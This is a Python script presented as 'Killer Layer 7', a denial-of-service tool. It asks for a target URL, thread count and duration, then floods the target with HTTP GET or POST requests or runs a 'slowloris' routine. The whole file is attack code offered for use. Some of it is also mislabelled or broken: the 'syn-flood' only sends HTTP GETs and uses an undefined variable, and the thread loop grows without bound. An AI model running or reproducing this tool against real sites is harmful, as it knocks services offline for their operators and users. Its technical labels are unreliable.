import requests
import threading
import time
import random
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich import print as rprint
import pyfiglet

console = Console()

# ASCII Art for the tool
ascii_art = pyfiglet.figlet_format("Killer Layer 7", font="slant")
console.print(Panel(ascii_art, title="Welcome to Killer Layer 7", subtitle="A Layer 7 DDoS Attack Tool", style="bold cyan"))

def load_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def http_get_flood(url, user_agents):
    while True:
        headers = {
            "User-Agent": random.choice(user_agents)
        }
        try:
            response = requests.get(url, headers=headers)
            console.print(f"[green]GET Request sent to {url}, Status Code: {response.status_code}[/green]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")

def slowloris_attack(target, user_agents):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Connection": "keep-alive",
        "Keep-Alive": "timeout=100"
    }
    
    while True:
        try:
            s = requests.Session()
            s.get(target, headers=headers)
            time.sleep(15)
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Slowloris Error: {e}[/red]")

def syn_flood(target, ip_addresses, port=80):
    while True:
        for ip in ip_addresses:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Connection": "keep-alive"
            }
            try:
                requests.get(f"http://{ip}:{port}", headers=headers)
                console.print(f"[green]SYN Flooding {ip} on port {port}[/green]")
            except requests.exceptions.RequestException as e:
                console.print(f"[red]Error: {e}[/red]")

def increase_attack(url, user_agents, post_data):
    while True:
        headers = {
            "User-Agent": random.choice(user_agents)
        }
        try:
            response = requests.post(url, headers=headers, data=random.choice(post_data))
            console.print(f"[green]Increase Attack sent to {url}, Status Code: {response.status_code}[/green]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")

def start_attack(url, attack_type, threads, duration, user_agents, ip_addresses=None, post_data=None):
    start_time = time.time()
    threads_list = []

    while time.time() - start_time < duration:
        for _ in range(threads):
            if attack_type == "http":
                thread = threading.Thread(target=http_get_flood, args=(url, user_agents))
            elif attack_type == "slowloris":
                thread = threading.Thread(target=slowloris_attack, args=(url, user_agents))
            elif attack_type == "syn-flood":
                thread = threading.Thread(target=syn_flood, args=(url, ip_addresses))  # Pass IPs here
            elif attack_type == "increase":
                thread = threading.Thread(target=increase_attack, args=(url, user_agents, post_data))
            else:
                console.print(f"[red]Invalid attack type selected[/red]")
                return
            
            thread.start()
            threads_list.append(thread)
        
        for thread in threads_list:
            thread.join(timeout=1)  # Join threads to limit resource usage

def main():
    console.print(Panel("LAYER 7: HTTP | SLOWLORIS | SYN-FLOOD | INCREASE", title="Attack Types", style="bold magenta"))
    
    attack_choice = Prompt.ask("[cyan]Choose attack type (http, slowloris, syn-flood, increase):[/cyan]").lower()
    
    url = Prompt.ask("[cyan]Enter target URL (e.g. http://example.com):[/cyan]")
    threads = Prompt.ask("[cyan]Enter number of threads:[/cyan]", default="10")
    duration = Prompt.ask("[cyan]Enter attack duration (in seconds):[/cyan]", default="60")

    user_agents = load_file("user_agents.txt")
    ip_addresses = load_file("ip_addresses.txt")  # Load IP addresses
    post_data = load_file("post_data.txt")  # Load post data for increase attack

    console.print(Panel(f"Attack Type: {attack_choice}\nTarget URL: {url}\nThreads: {threads}\nDuration: {duration} seconds", title="Attack Configuration", style="bold green"))
    
    console.print("[yellow][+] Starting attack...[/yellow]")
    
    if attack_choice == "syn-flood":
        start_attack(url, attack_choice, int(threads), int(duration), user_agents, ip_addresses)
    elif attack_choice == "increase":
        start_attack(url, attack_choice, int(threads), int(duration), user_agents, post_data=post_data)
    else:
        start_attack(url, attack_choice, int(threads), int(duration), user_agents)

    console.print("[yellow][+] Attack completed.[/yellow]")

if __name__ == "__main__":
    main()
